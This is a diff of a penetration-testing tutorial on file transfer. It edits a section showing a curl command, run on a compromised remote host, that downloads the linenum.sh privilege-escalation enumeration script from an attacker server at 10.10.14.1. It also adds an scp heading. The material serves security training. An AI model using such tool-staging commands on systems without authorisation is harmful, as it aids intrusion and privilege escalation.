@@ -23,11 +23,13 @@ linenum.sh 100%[==============================================>] 144.86K  --.-KB
 2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
 ```
 ```bash
-# Alternatively, we can use curl
+# Alternatively, we can use curl:
 
 user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
-# Note the use of -o to specify the file outp
-100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
+# Note the use of -o to specify the file output name.
 
+100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
 ```
 
+## scp
+Alternatively, we can use `scp` ***if* we have ssh user credentials:***
